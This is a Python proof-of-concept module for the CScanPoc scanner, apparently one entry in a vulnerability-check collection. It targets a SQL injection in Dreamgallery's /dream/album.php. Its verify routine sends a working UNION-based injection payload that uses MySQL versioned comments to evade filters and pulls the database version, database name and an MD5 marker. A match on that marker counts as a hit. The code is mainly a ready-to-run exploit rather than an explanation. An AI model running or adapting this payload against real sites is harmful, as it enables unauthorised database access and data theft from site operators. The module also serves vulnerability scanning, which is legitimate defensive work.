# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Dreamgallery_0001'  # 平台漏洞编号，留空
    name = 'Dreamgallery /dream/album.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-02-05'  # 漏洞公布时间
    desc = '''
        Dreamgallery /dream/album.php 文件存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Dreamgallery'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a1a4dabf-6eb7-4261-953c-be102891a406'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/dream/album.php?id=658+and+1*2*3=6+and+0+/*!12345union*/+/*!12345select*/+1,group_concat(0x53716c20496e6a656374696f6e20447265616d2047616c6c657279202d2046656c69706520416e647269616e20506569786f746f,0x3c62723e,version(),0x3a,md5(1),0x3a,database()),3,4,5,6,7,8,9,10--+'
            # 2.主体攻击代码部分
            target = arg+payload
            code, head, body, errcode, final_url = hh.http(target)
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
